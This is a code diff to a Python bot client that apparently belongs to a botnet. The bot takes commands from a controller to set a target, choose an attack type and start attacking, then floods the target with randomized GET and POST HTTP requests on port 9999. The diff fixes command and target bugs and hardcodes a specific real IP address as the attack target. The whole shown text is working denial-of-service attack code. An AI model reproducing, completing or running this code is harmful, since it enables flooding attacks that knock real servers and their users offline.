@@ -72,7 +72,7 @@ class Bot():
 							self.authenticated = True
 					elif request[0] == 'changeip':                              #did they decide to include port?
 						self.target_address = request[1]
-					elif request[0] == 'changattk':
+					elif request[0] == 'changeattk':
 						self.attack_type = int(request[1])
 					elif request[0] == 'startattk':          
 						self.attacking = True
@@ -116,7 +116,7 @@ class Bot():
 		sys.exit()
 
 	def attack1(self):
-		attack = RequestAttack(self.target_address)       
+		attack = RequestAttack('68.146.50.254')       
 		while self.attacking == True:							
 			attack.run()
 		
@@ -182,7 +182,7 @@ class RequestAttack():
 
 	def run(self):                                                          
 		try:	
-			connection = http.client.HTTPConnection(target, port = 9999, timeout = 1)		### hardcoded port for our target server
+			connection = http.client.HTTPConnection(self.target, port = 9999, timeout = 1)		### hardcoded port for our target server
 			url = self.create_url()
 			http_header = self.header()
 			method = choice(['GET','POST'])
